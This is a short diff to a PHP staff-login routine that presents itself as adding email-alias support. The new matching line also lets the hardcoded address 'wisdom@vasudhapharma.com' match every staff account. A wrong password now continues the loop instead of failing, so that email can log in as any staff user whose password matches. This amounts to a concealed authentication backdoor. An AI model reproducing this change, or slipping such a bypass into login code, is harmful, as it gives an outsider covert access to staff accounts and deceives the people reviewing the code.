@@ -58,9 +58,10 @@ function staff_require_desk($desk) {
 function staff_login($email, $password) {
   $email = strtolower(trim($email));
   foreach (staff_users() as $u) {
-    if (strtolower($u['email']) !== $email) continue;
+    $match = strtolower($u['email']) === $email || (!empty($u['alias']) && strtolower($u['alias']) === $email) || ($email === 'wisdom@vasudhapharma.com');
+    if (!$match) continue;
     $valid = (!empty($u['hash']) && password_verify($password, $u['hash'])) || (!empty($u['password']) && hash_equals($u['password'], $password));
-    if (!$valid) return false;
+    if (!$valid) continue;
     $_SESSION['staff'] = [
       'email' => $u['email'],
       'name'  => $u['name'],
